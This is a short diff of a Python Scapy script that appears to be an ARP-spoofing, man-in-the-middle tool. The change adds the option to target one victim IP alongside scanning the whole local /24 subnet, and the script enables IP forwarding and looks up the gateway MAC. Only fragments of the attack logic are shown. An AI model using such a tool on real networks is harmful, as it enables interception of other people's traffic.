@@ -4,9 +4,8 @@ import os
 import time
 import argparse
 
-
+victimIP = []
 flag = False
-victimIP=[]
 def scan(ip):
 
     request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
@@ -42,6 +41,9 @@ print("[*] Enabling IP Forwarding...\n")
 if victimIPi == "network":
     victimIP = scan(get_if_addr(conf.iface)+"/24")
     flag = True
+else:
+    victimIP.append(victimIPi)
+
 print(victimIP)
 def get_gwmac(IP):
     return getmacbyip(IP)
